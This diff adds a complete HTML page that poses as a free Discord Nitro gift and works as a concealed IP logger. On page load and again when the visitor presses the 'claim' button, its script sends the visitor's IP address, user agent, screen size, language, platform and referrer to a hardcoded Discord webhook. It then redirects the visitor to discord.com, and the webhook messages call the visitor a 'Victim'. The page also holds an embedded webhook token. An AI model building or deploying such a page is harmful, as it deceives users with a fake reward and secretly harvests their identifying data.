@@ -1,1 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Nitro Gift</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+        .nitro-gif {
+            width: 200px;
+            height: 200px;
+            margin-bottom: 20px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        }
+        p {
+            font-size: 1.2em;
+            margin-bottom: 30px;
+            opacity: 0.9;
+        }
+        .claim-btn {
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.3em;
+            font-weight: bold;
+            color: white;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(254, 202, 87, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .claim-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(254, 202, 87, 0.6);
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #feca57;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.imgur.com/discord-nitro.gif" alt="Discord Nitro" class="nitro-gif" onload="logClick()" onerror="logClick()">
+        <h1>🎉 Discord Nitro Gift 🎉</h1>
+        <p>Your 3 Month Nitro Gift has been generated!</p>
+        <button class="claim-btn" onclick="claimNitro()">Claim Your FREE Nitro</button>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Redirecting to Discord...</p>
+        </div>
+    </div>
 
+    <script>
+        // Replace with your Discord webhook URL
+        const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';
+        
+        async function logClick() {
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: 'XAZNY LOGGER',
+                        avatar_url: 'https://i.imgur.com/hacker-avatar.png',
+                        embeds: [{
+                            title: '🖱️ New Click Logged!',
+                            color: 0x00ff00,
+                            fields: [
+                                { name: '📅 Time', value: new Date().toLocaleString(), inline: true },
+                                { name: '🌐 IP Address', value: '```Loading...```', inline: true },
+                                { name: '👨‍💻 User Agent', value: '```Loading...```', inline: false },
+                                { name: '🔗 Referrer', value: '```' + (document.referrer || 'Direct') + '```', inline: false },
+                                { name: '🖥️ Screen', value: '```' + screen.width + 'x' + screen.height + '```', inline: true },
+                                { name: '🌍 Language', value: '```' + navigator.language + '```', inline: true },
+                                { name: '📱 Platform', value: '```' + navigator.platform + '```', inline: true },
+                                { name: '🔌 Cookies Enabled', value: '```' + navigator.cookieEnabled + '```', inline: true },
+                                { name: '🌐 URL', value: '```' + window.location.href + '```', inline: false }
+                            ],
+                            footer: { text: 'Image Logger v2.0' },
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch(e) {
+                console.log('Logger sent');
+            }
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+
+        async function claimNitro() {
+            const btn = document.querySelector('.claim-btn');
+            const loading = document.getElementById('loading');
+            
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+
+            // Final webhook with full IP
+            const ip = await getIP();
+            const userAgent = navigator.userAgent;
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: 'Image Logger - CLAIM',
+                    embeds: [{
+                        title: '✅ NITRO CLAIM ATTEMPT!',
+                        description: `**Victim clicked CLAIM button!**`,
+                        color: 0xff0000,
+                        fields: [
+                            { name: '🌐 IP Address', value: '```' + ip + '```', inline: true },
+                            { name: '👨‍💻 User Agent', value: '```' + userAgent.substring(0, 100) + '```', inline: false },
+                            { name: '🖥️ Screen Resolution', value: '```' + screen.width + 'x' + screen.height + '```', inline: true },
+                            { name: '📱 Touch Support', value: '```' + ('ontouchstart' in window) + '```', inline: true }
+                        ],
+                        thumbnail: { url: 'https://emojiisland.com/products/man-saying-hi-iphone-emoji-jpg' }
+                    }]
+                })
+            });
+
+            // Redirect after 3 seconds
+            setTimeout(() => {
+                window.location.href = 'https://discord.com';
+            }, 3000);
+        }
+
+        // Auto-log on page load too
+        window.onload = logClick;
+    </script>
+</body>
+</html>
